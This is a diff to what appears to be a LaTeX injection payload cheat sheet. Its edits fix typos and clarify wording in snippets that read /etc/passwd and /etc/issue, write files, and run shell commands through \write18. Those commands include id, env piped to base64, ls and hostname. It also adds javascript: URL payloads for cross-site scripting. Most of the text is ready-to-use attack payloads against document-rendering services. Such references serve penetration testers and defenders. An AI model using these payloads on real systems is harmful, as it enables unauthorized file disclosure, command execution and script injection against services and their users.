@@ -2,14 +2,16 @@
 
 ## Read file
 
-```bash
+Read file and interpret the LaTeX code in it:
+
+```tex
 \input{/etc/passwd}
-\include{password} # load .tex file
+\include{somefile} # load .tex file (somefile.tex)
 ```
 
-Read single lined file
+Read single lined file:
 
-```bash
+```tex
 \newread\file
 \openin\file=/etc/issue
 \read\file to\line
@@ -17,9 +19,9 @@ Read single lined file
 \closein\file
 ```
 
-Read multiple lined file
+Read multiple lined file:
 
-```bash
+```tex
 \newread\file
 \openin\file=/etc/passwd
 \loop\unless\ifeof\file
@@ -29,47 +31,52 @@ Read multiple lined file
 \closein\file
 ```
 
-Read text file, keep the formatting
+Read text file, **without** interpreting the content, it will only paste raw file content:
 
-```bash
+```tex
 \usepackage{verbatim}
 \verbatiminput{/etc/passwd}
 ```
 
 ## Write file
 
-```bash
+Write single lined file:
+
+```tex
 \newwrite\outfile
 \openout\outfile=cmd.tex
 \write\outfile{Hello-world}
+\write\outfile{Line 2}
+\write\outfile{I like trains}
 \closeout\outfile
 ```
 
 ## Command execution
 
-The input of the command will be redirected to stdin, use a temp file to get it.
+The output of the command will be redirected to stdout, therefore you need to use a temp file to get it.
 
-```bash
-\immediate\write18{env > output}
+```tex
+\immediate\write18{id > output}
 \input{output}
 ```
 
-If you get any LaTex error, consider using base64 to get the result without bad characters
+If you get any LaTex error, consider using base64 to get the result without bad characters (or use `\verbatiminput`):
 
-```bash
+```tex
 \immediate\write18{env | base64 > test.tex}
 \input{text.tex}
 ```
 
-```bash
-\input|ls|base4
+```tex
+\input|ls|base64
 \input{|"/bin/hostname"}
 ```
 
 ## Cross Site Scripting
 
 From [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130) 
-```bash
+
+```tex
 \url{javascript:alert(1)}
 \href{javascript:alert(1)}{placeholder}
 ```
